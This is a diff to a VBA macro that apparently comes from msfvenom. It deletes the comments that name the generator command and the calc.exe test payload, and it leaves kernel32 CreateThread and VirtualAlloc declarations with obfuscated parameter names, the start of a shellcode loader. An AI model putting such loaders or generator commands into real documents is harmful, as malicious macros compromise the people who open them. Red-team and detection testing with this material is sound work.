@@ -1,6 +1,3 @@
-# VBA Macro to test process execution 
-# msfvenom --arch x86 --platform windows -p windows/exec CMD=calc.exe -f vba
-
 #If Vba7 Then
         Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Xnabcz As Long, ByVal Fjxa As Long, ByVal Aiuyzqy As LongPtr, Aeqm As Long, ByVal Jrvdsfetk As Long, Ovrcmosez As Long) As LongPtr
         Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Hiyuxi As Long, ByVal Zrzeu As Long, ByVal Lvlkfhk As Long, ByVal Uiwoleu As Long) As LongPtr
